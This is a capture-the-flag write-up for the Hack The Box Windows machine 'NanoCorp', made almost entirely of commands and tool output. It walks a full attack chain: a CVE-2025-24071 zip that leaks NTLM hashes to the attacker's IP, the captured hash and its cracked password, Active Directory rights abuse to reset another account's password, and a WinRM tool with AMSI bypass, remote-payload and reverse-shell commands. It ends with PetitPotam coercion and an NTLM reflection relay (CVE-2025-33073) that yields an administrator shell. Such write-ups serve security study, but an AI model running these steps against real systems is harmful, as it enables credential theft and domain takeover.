---
tags:
  - HTB
  - Hacking
  - Boot2Root
  - Windows
  - NTLM-Reflection
---

| Name        | NanoCorp  |
| ----------- | --------- |
| OS          | Windows   |
| Base Points | Hard [40] |
| Status      | Done      |
# Recon

```bash
nmap -sCV -oA nmap/Nanocorp 10.10.11.93
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-08 22:04 EAT
Stats: 0:00:34 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 7.69% done; ETC: 22:06 (0:01:12 remaining)
Nmap scan report for 10.1xxxx.xxx.xxx
Host is up (0.38s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
80/tcp   open  http              Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
|_http-title: Did not follow redirect to http://nanocorp.htb/
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-11-09 02:05:28Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?
5986/tcp open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
| ssl-cert: Subject: commonName=dc01.nanocorp.htb
| Subject Alternative Name: DNS:dc01.nanocorp.htb
| Not valid before: 2025-04-06T22:58:43
|_Not valid after:  2026-04-06T23:18:43
|_ssl-date: TLS randomness does not represent time
|_http-title: Not Found
| tls-alpn: 
|_  http/1.1
Service Info: Hosts: nanocorp.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m57s
| smb2-time: 
|   date: 2025-11-09T02:06:14
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 135.75 seconds
```
# Enumeration

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt \
-u http://nanocorp.htb/ \
-H "Host: FUZZ.nanocorp.htb" \
-fs 331-350 \
-fw 22
```

Add `hire.nanocorp.htb` to hostfile.

![[nanocorp.png]]
# Initial Foothold
## [CVE-2025-24071](https://github.com/Marcejr117/CVE-2025-24071_PoC)

```bash
┌──(venv)─(at0m㉿DESKTOP-RA9DG2K)-[~/CVE-2025-24071_PoC]
└─$ python3 poc.py
Enter your file name: exploit
Enter IP (EX: 192.168.1.162): 10.10.14.120
completed

┌──(venv)─(at0m㉿DESKTOP-RA9DG2K)-[~/CVE-2025-24071_PoC]
└─$ ls
exploit.zip  poc.py  README.md
```

Upload it in `hire.nanocorp.htb`:

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~]
└─$ sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.120]
    Responder IPv6             [dead:beef:2::1076]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-8Y8T1OZF84Z]
    Responder Domain Name      [1JGG.LOCAL]
    Responder DCE-RPC Port     [46918]

[*] Version: Responder 3.1.7.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
[*] To sponsor Responder: https://paypal.me/PythonResponder

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.11.93
[SMB] NTLMv2-SSP Username : NANOCORP\web_svc
[SMB] NTLMv2-SSP Hash     : web_svc::NANOCORP:6b3883350a043405:27D3BA2004C6B4AEA9DEDD33DBB1C0F8:010100000000000080B8488DC651DC0131EE2F9CCCAEEC3C000000000200080031004A004700470001001E00570049004E002D00380059003800540031004F005A004600380034005A0004003400570049004E002D00380059003800540031004F005A004600380034005A002E0031004A00470047002E004C004F00430041004C000300140031004A00470047002E004C004F00430041004C000500140031004A00470047002E004C004F00430041004C000700080080B8488DC651DC010600040002000000080030003000000000000000000000000020000022B3111E5DF738DF1A98C01376A91CB758BCC7B30DBB83F536AD3372D47329180A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100320030000000000000000000
```

Pass is `dksehdgh712!@#` after cracking.
## Bloodhound

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~/nanocorp]
└─$ bloodhound-python -d nanocorp.htb -u web_svc -p 'dksehdgh712!@#' -ns 10.10.11.93 -c All
```

Fuck my Bh isn't working.

```bash
┌──(venv)─(at0m㉿DESKTOP-RA9DG2K)-[~/nanocorp]
└─$ # Check if web_svc can add itself to groups
bloodyAD --host dc01.nanocorp.htb -d nanocorp.htb -u 'web_svc' -p 'dksehdgh712!@#' get object 'IT_SUPPORT' --attr member


distinguishedName: CN=IT_Support,CN=Users,DC=nanocorp,DC=htb
```

```bash

┌──(venv)─(at0m㉿DESKTOP-RA9DG2K)-[~/nanocorp]
└─$ # Check what permissions web_svc has on the IT_SUPPORT group object
bloodyAD --host dc01.nanocorp.htb -d nanocorp.htb -u 'web_svc' -p 'dksehdgh712!@#' get object 'IT_SUPPORT' --attr ntSecurityDescriptor

distinguishedName: CN=IT_Support,CN=Users,DC=nanocorp,DC=htb
nTSecurityDescriptor: O:S-1-5-21-2261381271-1331810270-697239744-512G:S-1-5-21-2261381271-1331810270-697239744-512D:AI(OA;;SW;bf9679c0-0de6-11d0-a285-00aa003049e2;;S-1-5-21-2261381271-1331810270-697239744-1103)(OA;;RP;46a9b11d-60ae-405a-b7e8-ff8a58d456d2;;S-1-5-32-560)(OA;;CR;ab721a55-1e2f-11d0-9819-00aa0040529b;;S-1-5-11)(A;;0x20014;;;S-1-5-21-2261381271-1331810270-697239744-1103)(A;;0xf01ff;;;S-1-5-21-2261381271-1331810270-697239744-512)(A;;0xf01ff;;;S-1-5-32-548)(A;;0x20094;;;S-1-5-10)(A;;0x20094;;;S-1-5-11)(A;;0xf01ff;;;S-1-5-18)(OA;CIIOID;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;RP;4c164200-20c0-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;RP;037088f8-0ae1-11d2-b422-00a0c968f939;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIID;0x30;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-2261381271-1331810270-697239744-526)(OA;CIID;0x30;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-2261381271-1331810270-697239744-527)(OA;CIIOID;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-3-0)(OA;CIIOID;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-10)(OA;CIIOID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIIOID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIIOID;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-10)(OA;CIIOID;0x20094;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;0x20094;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;0x20094;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;OICIID;0x30;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;S-1-5-10)(OA;CIID;0x130;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;S-1-5-10)(A;CIID;0xf01ff;;;S-1-5-21-2261381271-1331810270-697239744-519)(A;CIID;LC;;;S-1-5-32-554)(A;CIID;0xf01bd;;;S-1-5-32-544)
```

```
(OA;;SW;bf9679c0-0de6-11d0-a285-00aa003049e2;;S-1-5-21-2261381271-1331810270-697239744-1103)
```

- `OA` = Object Allow ACE
- `SW` = **Self-Membership Write** (ADS_RIGHT_DS_SELF)
- `bf9679c0-0de6-11d0-a285-00aa003049e2` = Group objects GUID
- `S-1-5-21-2261381271-1331810270-697239744-1103` = **web_svc's SID**

**web_svc has "SELF" membership rights on the IT_SUPPORT group** meaning web_svc can add ITSELF to the IT_SUPPORT group!

See on BH that `IT_Support` has `forceChangePassword` to `monitoring_svc`.

Shortest path to owned object show you the path directly.

![[nanocorp2.png]]


```
web_svc → AddSelf → IT_SUPPORT → ForceChangePassword → monitoring_svc → Higher Privileges
```

```bash
┌──(venv)─(at0m㉿DESKTOP-RA9DG2K)-[~/nanocorp]
└─$  bloodyAD --host dc01.nanocorp.htb -d nanocorp.htb -u 'web_svc' -p 'dksehdgh712!@#' -k add groupMember IT_SUPPORT web_svc
[+] web_svc added to IT_SUPPORT

┌──(venv)─(at0m㉿DESKTOP-RA9DG2K)-[~/nanocorp]
└─$ bloodyAD --host dc01.nanocorp.htb -d nanocorp.htb -u 'web_svc' -p 'dksehdgh712!@#' -k set password monitoring_svc 'TestPass123@'
[+] Password changed successfully!
```

Use [winrmexec](https://github.com/ozelis/winrmexec).

```bash
┌──(venv)─(at0m㉿DESKTOP-RA9DG2K)-[~/nanocorp/winrmexec]
└─$ python3 evil_winrmexec.py -ssl -port 5986 NANOCORP.HTB/monitoring_svc:'TestPass123@'@dc01.nanocorp.htb -k
/home/at0m/venv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
[*] '-target_ip' not specified, using dc01.nanocorp.htb
[*] '-url' not specified, using https://dc01.nanocorp.htb:5986/wsman
[*] '-spn' not specified, using HTTP/dc01.nanocorp.htb@NANOCORP.HTB
[*] '-dc-ip' not specified, using NANOCORP.HTB
[*] requesting TGT for NANOCORP.HTB\monitoring_svc
[*] requesting TGS for HTTP/dc01.nanocorp.htb@NANOCORP.HTB

Ctrl+D to exit, Ctrl+C will try to interrupt the running pipeline gracefully
This is not an interactive shell! If you need to run programs that expect
inputs from stdin, or exploits that spawn cmd.exe, etc., pop a !revshell

Special !bangs:
  !download RPATH [LPATH]          # downloads a file or directory (as a zip file); use 'PATH'
                                   # if it contains whitespace

  !upload [-xor] LPATH [RPATH]     # uploads a file; use 'PATH' if it contains whitespace, though use iwr
                                   # if you can reach your ip from the box, because this can be slow;
                                   # use -xor only in conjunction with !psrun/!netrun

  !amsi                            # amsi bypass, run this right after you get a prompt

  !psrun [-xor] URL                # run .ps1 script from url; uses ScriptBlock smuggling, so no !amsi patching is
                                   # needed unless that script tries to load a .NET assembly; if you can't reach
                                   # your ip, !upload with -xor first, then !psrun -xor 'c:\foo\bar.ps1' (needs absolute path)

  !netrun [-xor] URL [ARG] [ARG]   # run .NET assembly from url, use 'ARG' if it contains whitespace;
                                   # !amsi first if you're getting '...program with an incorrect format' errors;
                                   # if you can't reach your ip, !upload with -xor first then !netrun -xor 'c:\foo\bar.exe' (needs absolute path)

  !revshell IP PORT                # pop a revshell at IP:PORT with stdin/out/err redirected through a socket; if you can't reach your ip and you
                                   # you need to run an executable that expects input, try:
                                   # PS> Set-Content -Encoding ASCII 'stdin.txt' "line1`nline2`nline3"
                                   # PS> Start-Process some.exe -RedirectStandardInput 'stdin.txt' -RedirectStandardOutput 'stdout.txt'

  !log                             # start logging output to winrmexec_[timestamp]_stdout.log
  !stoplog                         # stop logging output to winrmexec_[timestamp]_stdout.log

PS C:\Users\monitoring_svc\Documents> cd ..\Desktop
PS C:\Users\monitoring_svc\Desktop> ls


    Directory: C:\Users\monitoring_svc\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         11/9/2025   7:40 AM             34 user.txt


PS C:\Users\monitoring_svc\Desktop> cat user.txt
5fa176064918e02399a3fdc9bf4eba8d
```
# Privilege Escalation

```bash
PS C:\Users\monitoring_svc\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

```bash
PS C:\Users\monitoring_svc\Desktop> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                          Attributes                                 
========================================== ================ ============================================ ==================================================
Everyone                                   Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
NANOCORP\Protected Users                   Group            S-1-5-21-2261381271-1331810270-697239744-525 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                     Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                                                 
```
## NTLM Reflection - CVE-2025-33073

Read this [article](https://zeronetworks.com/blog/examining-relay-attacks-through-the-lens-of-cve-2025-33073).

We need `ntlmrelayx` with `winrms` support. We need latest Impacket.

```bash
pip install git+https://github.com/fortra/impacket.git
```

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~]
└─$ nxc smb nanocorp.htb -u WEB_SVC -p 'dksehdgh712!@#' -M coerce_plus -o METHOD=Petitpotam LISTENER=localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
SMB         10.10.11.93     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:nanocorp.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.93     445    DC01             [+] nanocorp.htb\WEB_SVC:dksehdgh712!@#
COERCE_PLUS 10.10.11.93     445    DC01             VULNERABLE, PetitPotam
COERCE_PLUS 10.10.11.93     445    DC01             Exploit Success, lsarpc\EfsRpcAddUsersToFile
```

```bash
┌──(venv)─(at0m㉿DESKTOP-RA9DG2K)-[~/CVE-2025-24071_PoC/impacket]
└─$ ntlmrelayx.py -smb2support -t winrms://10.10.11.93 -i
Impacket v0.14.0.dev0+20251107.4500.2f1d6eb2 - Copyright Fortra, LLC and its affiliated companies

[*] Protocol Client SMB loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client WINRMS loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client DCSYNC loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Setting up WinRM (HTTP) Server on port 5985
[*] Setting up WinRMS (HTTPS) Server on port 5986
[*] Setting up RPC Server on port 135
[*] Multirelay disabled

[*] Servers started, waiting for connections
[*] (SMB): Received connection from 10.10.11.93, attacking target winrms://10.10.11.93
[!] The client requested signing, relaying to WinRMS might not work!
[*] HTTP server returned error code 500, this is expected, treating as a successful login
[*] (SMB): Authenticating connection from /@10.10.11.93 against winrms://10.10.11.93 SUCCEED [1]
[*] winrms:///@10.10.11.93 [1] -> Started interactive WinRMS shell via TCP on 127.0.0.1:11000
[*] All targets processed!
[*] (SMB): Connection from 10.10.11.93 controlled, but there are no more targets le
```

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~]
└─$ nc 127.0.0.1 11000
Type help for list of commands

# type C:\Users\Administrator\Desktop\root.txt
f609d95a2f0b8fb0fe55af25ee4360f0
```

---
